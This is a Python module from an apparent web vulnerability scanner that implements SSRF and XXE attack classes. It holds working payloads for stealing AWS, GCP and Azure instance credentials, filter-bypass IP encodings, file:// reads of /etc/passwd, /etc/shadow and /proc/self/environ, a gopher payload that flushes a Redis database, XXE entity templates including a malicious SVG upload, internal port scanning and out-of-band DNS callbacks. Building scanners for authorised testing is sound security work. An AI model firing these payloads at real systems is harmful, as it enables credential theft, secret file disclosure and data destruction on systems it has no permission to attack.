from __future__ import annotations
import concurrent.futures as _fut
import time
import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse, urljoin

from .base import BaseScanner
from websecure.core.reporting import add_result
from websecure.core.payloads import load_external_payloads

try:
    from websecure.core.utils import random_string
except ImportError:
    import random as _rand
    import string as _string
    def random_string(n: int = 8) -> str:
        return "".join(_rand.choices(_string.ascii_lowercase + _string.digits, k=n))

logger = logging.getLogger(__name__)

# =============================================================================
# Configuration dataclasses
# =============================================================================

@dataclass
class OASTConfig:
    enabled: bool = True
    provider: str = "generic"
    dns_domain: Optional[str] = None
    token_prefix: str = "ws"
    timeout: int = 15
    enable_local_schemes: bool = True
    enable_dict_scheme: bool = False
    enable_tftp_scheme: bool = True
    enable_metadata_probes: bool = True
    timing_threshold: float = 2.0
    base_headers: Dict[str, str] = field(default_factory=dict)
    base_cookies: Dict[str, str] = field(default_factory=dict)


@dataclass
class ScannerTuning:
    concurrency: int = 6
    retries: int = 0
    methods: Tuple[str, ...] = ("GET", "POST")
    user_agent: str = "WebSecure/SSRF-XXE 1.2"
    respect_redirects: bool = True


@dataclass
class SSRFXXEConfig:
    oast: OASTConfig = field(default_factory=OASTConfig)
    tuning: ScannerTuning = field(default_factory=ScannerTuning)


# =============================================================================
# Constants
# =============================================================================

COMMON_URL_PARAMS = [
    "url", "redirect", "next", "dest", "destination", "callback", "u",
    "return", "return_to", "continue", "target", "endpoint", "webhook",
    "feed", "link", "out", "source", "file", "path", "image", "img",
    "avatar", "download", "proxy", "fetch", "load", "open", "read",
]

BODY_URL_KEYS = [
    "url", "webhook", "avatar", "image", "callback", "target",
    "endpoint", "feed", "source", "file", "path", "proxy",
]

# Cloud metadata endpoints
METADATA_BASES = [
    "http://169.254.169.254",   # AWS/GCP/Azure
    "http://100.100.100.200",   # Alibaba Cloud
    "http://192.168.0.1",       # Common router
    "http://10.0.0.1",          # Internal gateway
]
AWS_PATHS = [
    "/latest/meta-data/",
    "/latest/meta-data/iam/security-credentials/",
    "/latest/meta-data/hostname",
    "/latest/meta-data/public-keys/",
    "/latest/user-data",
    "/latest/dynamic/instance-identity/document",
]
GCP_PATHS = [
    "/computeMetadata/v1/instance/service-accounts/default/token",
    "/computeMetadata/v1/project/project-id",
    "/computeMetadata/v1/instance/hostname",
]
AZURE_PATHS = [
    "/metadata/instance?api-version=2021-02-01",
    "/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/",
]
GCP_HEADERS = {"Metadata-Flavor": "Google"}
AZURE_HEADERS = {"Metadata": "true"}

# Cloud metadata success markers
METADATA_MARKERS = [
    "ami-id", "instance-id", "local-ipv4", "public-hostname",
    "service-accounts", "project-id", "subscriptionId",
    "IAMCredentials", "Token", "Expiration",
]

# Internal port scanning targets
_INTERNAL_IPS = ["127.0.0.1", "localhost", "0.0.0.0"]
_SCAN_PORTS = [21, 22, 80, 443, 2375, 3306, 5432, 5672, 6379, 8080, 8443, 8888, 9200, 27017]

# URL scheme abuse payloads
_SCHEME_PAYLOADS = [
    "file:///etc/passwd",
    "file:///etc/shadow",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:6379/info",
    "dict://127.0.0.1:11211/stats",
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A",
]

# XXE template — {U} will be replaced with the target URI
XXE_POC = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE x [ <!ENTITY ext SYSTEM "{U}"> ]>
<root><v>&ext;</v></root>"""

# XXE via SVG (for image upload endpoints)
XXE_SVG = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "{U}"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
</svg>"""

# XXE file targets
_XXE_TARGETS = [
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "file:///windows/win.ini",
]

# XXE success markers (content that should NOT appear in normal responses)
_XXE_MARKERS = [
    r"root:x:0:0",
    r"\[fonts\]",
    r"HOME=/",
    r"PATH=/",
]

# Error fingerprints indicating SSRF connectivity
ERROR_FINGERPRINTS = [
    "connection refused", "timed out", "no route to host", "invalid host",
    "host is unreachable", "could not resolve", "failed to connect",
    "network unreachable", "connection reset",
]


# =============================================================================
# Helper functions
# =============================================================================

def _encode_ip_variants(ip: str) -> List[str]:
    """Generate IP address encoding variants to bypass naive SSRF filters."""
    try:
        a, b, c, d = (int(x) for x in ip.split("."))
        return [
            ip,
            ".".join(f"{p:03o}" for p in (a, b, c, d)),                        # Octal
            ".".join(f"{p:02x}" for p in (a, b, c, d)),                        # Hex dotted
            str(a * (256 ** 3) + b * (256 ** 2) + c * 256 + d),               # Decimal
            "0x" + "".join(f"{p:02x}" for p in (a, b, c, d)),                 # Hex single
            f"0177.0.0.1" if ip == "127.0.0.1" else ip,                        # Mixed octal
        ]
    except ValueError:
        return [ip]


def _inject_url_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query))
    qs[param] = value
    return urlunparse(parsed._replace(query=urlencode(qs)))


def _has_metadata_marker(text: str) -> bool:
    lower = text.lower()
    return any(m.lower() in lower for m in METADATA_MARKERS)


def _detect_xxe_in_response(text: str) -> Optional[str]:
    """Returns matched marker if XXE file contents appear in the response."""
    for marker in _XXE_MARKERS:
        if re.search(marker, text):
            return marker
    return None


# =============================================================================
# SSRFScanner — proper BaseScanner subclass
# =============================================================================

class SSRFScanner(BaseScanner):
    """
    Server-Side Request Forgery (SSRF) Scanner.

    Techniques:
    - Cloud metadata endpoint probing (AWS, GCP, Azure, Alibaba)
    - IP encoding variants (octal, hex, decimal) to bypass allow-lists
    - URL scheme abuse (file://, gopher://, dict://)
    - Internal port scanning via response timing
    - OAST DNS callback if dns_domain is configured in OASTConfig
    - Body-based SSRF (POST parameters containing URL fields)
    """

    name = "ssrf"
    phase = "offensive"

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        logger.info(f"[SSRF] Scanning {len(endpoints)} endpoints")

        for ep in endpoints:
            self._scan_endpoint(ep, bucket)

        return self.results

    def _scan_endpoint(self, url: str, bucket: str):
        parsed = urlparse(url)
        qs = parse_qsl(parsed.query)
        url_params = [p for p, _ in qs if p.lower() in COMMON_URL_PARAMS]

        for param in url_params:
            self._test_cloud_metadata(url, param, qs, bucket)
            self._test_scheme_abuse(url, param, bucket)
            if self.config.oast.enable_metadata_probes:
                self._test_internal_ports(url, param, bucket)

        # Body-based SSRF: probe POST endpoints
        if qs:
            self._test_body_ssrf(url, bucket)

        # OAST DNS callback
        if self.config.oast.dns_domain:
            self._test_oast_dns(url, url_params, bucket)

    # -------------------------------------------------------------------------
    # Cloud metadata probing
    # -------------------------------------------------------------------------

    def _test_cloud_metadata(self, url: str, param: str, qs: List[Tuple], bucket: str):
        metadata_targets = []
        for base_ip in ["169.254.169.254", "100.100.100.200"]:
            for variant in _encode_ip_variants(base_ip):
                for path in AWS_PATHS:
                    metadata_targets.append((f"http://{variant}{path}", {}, "AWS"))
                for path in GCP_PATHS:
                    metadata_targets.append((f"http://{variant}{path}", GCP_HEADERS, "GCP"))
                for path in AZURE_PATHS:
                    metadata_targets.append((f"http://{variant}{path}", AZURE_HEADERS, "Azure"))

        for meta_url, extra_headers, cloud in metadata_targets:
            t_url = _inject_url_param(url, param, meta_url)
            try:
                headers = {**extra_headers}
                resp = self.session.get(t_url, headers=headers, timeout=4, allow_redirects=True)
                if resp.status_code == 200 and _has_metadata_marker(resp.text):
                    self.add(bucket, {
                        "type": "SSRF — Cloud Metadata Exposed",
                        "severity": "Critical",
                        "url": url,
                        "parameter": param,
                        "payload": meta_url,
                        "cloud_provider": cloud,
                        "evidence": resp.text[:300],
                    })
                    logger.warning(f"[SSRF] Cloud metadata ({cloud}) via {url} param={param}")
                    return  # one confirmed finding per param is sufficient
            except Exception:
                pass

    # -------------------------------------------------------------------------
    # URL scheme abuse
    # -------------------------------------------------------------------------

    def _test_scheme_abuse(self, url: str, param: str, bucket: str):
        if not self.config.oast.enable_local_schemes:
            return

        for payload in _SCHEME_PAYLOADS:
            t_url = _inject_url_param(url, param, payload)
            try:
                resp = self.session.get(t_url, timeout=6, allow_redirects=False)
                # Success: either content returned or a redirect to the scheme-fetched resource
                text = resp.text or ""
                # file:///etc/passwd marker
                if "root:x:0:0" in text or "[fonts]" in text or "for 16-bit" in text:
                    self.add(bucket, {
                        "type": "SSRF — URL Scheme Abuse (LFI via file://)",
                        "severity": "Critical",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": text[:200],
                    })
                    return
                # gopher/dict: if server responds with data, it fetched the URL
                if payload.startswith(("dict://", "gopher://")) and resp.status_code == 200 and len(text) > 10:
                    self.add(bucket, {
                        "type": f"SSRF — URL Scheme Abuse ({payload.split(':')[0]}://)",
                        "severity": "High",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": text[:200],
                    })
                    return
            except Exception:
                pass

    # -------------------------------------------------------------------------
    # Internal port scanning via timing
    # -------------------------------------------------------------------------

    def _test_internal_ports(self, url: str, param: str, bucket: str):
        """
        Probes internal ports by injecting http://127.0.0.1:<port> and measuring timing.
        Open ports: server-side request succeeds quickly.
        Closed ports: immediate connection refused (fast).
        Filtered ports: TCP timeout (slow, > timing_threshold).
        """
        threshold = self.config.oast.timing_threshold

        # Establish baseline timing
        try:
            t0 = time.time()
            self.session.get(url, timeout=5)
            baseline = time.time() - t0
        except Exception:
            baseline = 1.0

        for ip in ["127.0.0.1", "localhost"]:
            for port in _SCAN_PORTS:
                probe_url = f"http://{ip}:{port}/"
                t_url = _inject_url_param(url, param, probe_url)
                t0 = time.time()
                try:
                    resp = self.session.get(t_url, timeout=threshold + 2, allow_redirects=False)
                    elapsed = time.time() - t0
                    text = resp.text or ""
                    # Open port signals: 200 response with content, or very fast response
                    if resp.status_code == 200 and len(text) > 10:
                        self.add(bucket, {
                            "type": f"SSRF — Internal Port Open: {ip}:{port}",
                            "severity": "High",
                            "url": url,
                            "parameter": param,
                            "payload": probe_url,
                            "evidence": f"HTTP 200 with {len(text)} bytes in {elapsed:.2f}s",
                        })
                    elif elapsed > baseline + threshold:
                        # Timeout → port is filtered → still SSRF-reachable (blind)
                        self.add(bucket, {
                            "type": f"SSRF — Blind Internal Port Probe: {ip}:{port}",
                            "severity": "Medium",
                            "url": url,
                            "parameter": param,
                            "payload": probe_url,
                            "evidence": f"Request took {elapsed:.2f}s (baseline {baseline:.2f}s)",
                        })
                except Exception:
                    pass

    # -------------------------------------------------------------------------
    # Body-based SSRF
    # -------------------------------------------------------------------------

    def _test_body_ssrf(self, url: str, bucket: str):
        for key in BODY_URL_KEYS:
            for meta_base in METADATA_BASES[:2]:
                for path in AWS_PATHS[:2]:
                    payload = meta_base + path
                    try:
                        resp = self.session.post(url, json={key: payload}, timeout=5)
                        if resp.status_code == 200 and _has_metadata_marker(resp.text):
                            self.add(bucket, {
                                "type": "SSRF — Body-Based Cloud Metadata Exposure",
                                "severity": "Critical",
                                "url": url,
                                "parameter": key,
                                "payload": payload,
                                "evidence": resp.text[:300],
                            })
                            return
                    except Exception:
                        pass

    # -------------------------------------------------------------------------
    # OAST DNS callback
    # -------------------------------------------------------------------------

    def _test_oast_dns(self, url: str, params: List[str], bucket: str):
        domain = self.config.oast.dns_domain
        if not domain:
            return

        token = random_string(8)
        callback_url = f"http://{token}.{domain}/"

        for param in params:
            t_url = _inject_url_param(url, param, callback_url)
            try:
                self.session.get(t_url, timeout=self.config.oast.timeout, allow_redirects=True)
                # DNS resolution will occur server-side; detection requires an OAST listener
                # Flag as potential SSRF for manual confirmation
                self.add(bucket, {
                    "type": "SSRF — OAST DNS Callback Sent",
                    "severity": "High",
                    "url": url,
                    "parameter": param,
                    "payload": callback_url,
                    "evidence": f"Check DNS logs for {token}.{domain}",
                    "note": "Confirm OOB DNS resolution in your OAST server logs",
                })
                logger.info(f"[SSRF] OAST callback sent for param={param}, token={token}")
            except Exception:
                pass


# =============================================================================
# XXEScanner — proper BaseScanner subclass
# =============================================================================

class XXEScanner(BaseScanner):
    """
    XML External Entity (XXE) Injection Scanner.

    Techniques:
    - Detect XML-accepting endpoints (Content-Type: application/xml responses or form XML inputs)
    - Inject XXE_POC template targeting /etc/passwd, /etc/hostname, /proc/self/environ
    - Error-based XXE detection (file contents in response)
    - XXE via SVG upload (for endpoints accepting SVG)
    - Blind XXE detection via timing (OOB connection attempt)
    """

    name = "xxe"
    phase = "offensive"

    def __init__(self, session=None, results: Dict = None, debug=False,
                 config: Optional[SSRFXXEConfig] = None):
        super().__init__(session, results, debug)
        self.config = config or SSRFXXEConfig()

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        logger.info(f"[XXE] Scanning {len(endpoints)} endpoints")

        for ep in endpoints:
            self._scan_endpoint(ep, bucket)

        return self.results

    def _scan_endpoint(self, url: str, bucket: str):
        # 1. Probe as XML POST endpoint
        self._test_xml_post(url, bucket)

        # 2. Test SVG upload if endpoint looks like it accepts files
        self._test_svg_xxe(url, bucket)

        # 3. Blind XXE via OAST if configured
        if self.config.oast.dns_domain:
            self._test_blind_xxe_oast(url, bucket)

    # -------------------------------------------------------------------------
    # Error-based XXE via direct XML POST
    # -------------------------------------------------------------------------

    def _test_xml_post(self, url: str, bucket: str):
        for target_file in _XXE_TARGETS:
            payload = XXE_POC.replace("{U}", target_file)
            headers = {"Content-Type": "application/xml"}
            try:
                resp = self.session.post(url, data=payload.encode(), headers=headers, timeout=8)
                text = resp.text or ""
                marker = _detect_xxe_in_response(text)
                if marker:
                    self.add(bucket, {
                        "type": "XXE — Error-Based File Read",
                        "severity": "Critical",
                        "url": url,
                        "payload_target": target_file,
                        "evidence": f"Marker '{marker}' found in response: {text[:200]}",
                    })
                    logger.warning(f"[XXE] File read confirmed at {url} via {target_file}")
                    return
                # Also check for XML parse errors (reveals parser / DOCTYPE processing)
                if re.search(r"(?i)XML.*parse.*error|DOCTYPE.*not.*allowed|entity.*not.*permitted", text):
                    self.add(bucket, {
                        "type": "XXE — DOCTYPE Processing Detected",
                        "severity": "Medium",
                        "url": url,
                        "payload_target": target_file,
                        "evidence": "Server references DOCTYPE in error — XXE processing likely enabled",
                    })
                    return
            except Exception:
                pass

    # -------------------------------------------------------------------------
    # XXE via SVG upload
    # -------------------------------------------------------------------------

    def _test_svg_xxe(self, url: str, bucket: str):
        for target_file in _XXE_TARGETS[:2]:
            svg_payload = XXE_SVG.replace("{U}", target_file).encode()
            try:
                resp = self.session.post(
                    url,
                    files={"file": ("ws_xxe.svg", svg_payload, "image/svg+xml")},
                    timeout=8,
                )
                text = resp.text or ""
                marker = _detect_xxe_in_response(text)
                if marker:
                    self.add(bucket, {
                        "type": "XXE — File Read via SVG Upload",
                        "severity": "Critical",
                        "url": url,
                        "payload_target": target_file,
                        "evidence": f"Marker '{marker}' found after SVG upload: {text[:200]}",
                    })
                    logger.warning(f"[XXE] SVG XXE confirmed at {url} reading {target_file}")
                    return
            except Exception:
                pass

    # -------------------------------------------------------------------------
    # Blind XXE via OAST DNS callback
    # -------------------------------------------------------------------------

    def _test_blind_xxe_oast(self, url: str, bucket: str):
        domain = self.config.oast.dns_domain
        token = random_string(8)
        oast_url = f"http://{token}.{domain}/"
        payload = XXE_POC.replace("{U}", oast_url)
        headers = {"Content-Type": "application/xml"}
        try:
            self.session.post(url, data=payload.encode(), headers=headers,
                              timeout=self.config.oast.timeout)
            self.add(bucket, {
                "type": "XXE — Blind OOB DNS Callback Sent",
                "severity": "High",
                "url": url,
                "payload_target": oast_url,
                "evidence": f"Check OAST DNS logs for {token}.{domain}",
                "note": "Confirm OOB DNS resolution in your OAST server logs",
            })
        except Exception:
            pass


# =============================================================================
# Legacy entry points (backward-compatible with main.py dynamic import)
# =============================================================================

def run_ssrf_xxe_scan(ctx):
    """
    Legacy entry point using ScanContext from main.py.
    Delegates to SSRFScanner and XXEScanner.
    """
    session = ctx.session
    results = getattr(ctx, "results", {})

    # Collect endpoints
    endpoints: Set[str] = set(results.get("endpoints", []))
    discovery = results.get("discovery", {})
    if isinstance(discovery, dict):
        for u in discovery.get("query", []):
            if isinstance(u, str) and "://" in u:
                endpoints.add(u)

    targets = list(endpoints)
    if not targets:
        return

    logger.info(f"[SSRF/XXE] Scanning {len(targets)} endpoints")

    ssrf = SSRFScanner(session=session, results=results)
    ssrf.run(targets[0] if targets else "", endpoints=targets)

    xxe = XXEScanner(session=session, results=results)
    xxe.run(targets[0] if targets else "", endpoints=targets)


def run(ctx):
    """Main entry point for generic runner."""
    return run_ssrf_xxe_scan(ctx)


# Alias for main.py dynamic imports
scan = run_ssrf_xxe_scan
